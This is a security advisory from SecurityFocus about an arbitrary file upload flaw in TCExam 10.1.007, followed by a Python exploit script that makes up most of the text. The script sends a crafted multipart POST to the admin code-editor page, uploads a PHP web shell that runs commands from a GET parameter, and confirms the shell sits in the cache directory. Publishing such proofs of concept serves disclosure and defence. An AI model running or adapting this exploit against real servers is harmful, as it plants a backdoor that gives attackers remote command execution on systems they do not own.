source: http://www.securityfocus.com/bid/40511/info

TCExam is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

TCExam 10.1.007 is vulnerable; other versions may also be affected. 

import sys, socket
host = 'localhost'
tc_exam = 'http://' + host + '/TCExam'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)

    content = '------x\r\n'\
              'Content-Disposition: form-data; name="sendfile0"\r\n'\
              '\r\n'\
              'shell.php\r\n'\
              '------x\r\n'\
              'Content-Disposition: form-data; name="userfile0"; filename="shell.php"\r\n'\
              'Content-Type: application/octet-stream\r\n'\
              '\r\n'\
              '<?php echo "<pre>" + system($_GET["CMD"]) + "</pre>"; ?>\r\n'\
              '------x--\r\n'\
              '\r\n'

    header = 'POST ' + tc_exam + '/admin/code/tce_functions_tcecode_editor.php HTTP/1.1\r\n'\
             'Host: ' + host + '\r\n'\
             'Proxy-Connection: keep-alive\r\n'\
             'User-Agent: x\r\n'\
             'Content-Length: ' + str(len(content)) + '\r\n'\
             'Cache-Control: max-age=0\r\n'\
             'Origin: null\r\n'\
             'Content-Type: multipart/form-data; boundary=----x\r\n'\
             'Accept: text/html\r\n'\
             'Accept-Encoding: gzip,deflate,sdch\r\n'\
             'Accept-Language: en-US,en;q=0.8\r\n'\
             'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'\
             'Cookie: LastVisit=1275442604\r\n'\
             '\r\n'

    s.send(header + content)

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in s.recv(8192):
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + tc_exam + '/cache/shell.php HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192): print 'shell not found'        
    else: print 'shell located at ' + tc_exam + '/cache/shell.php'

upload_shell()
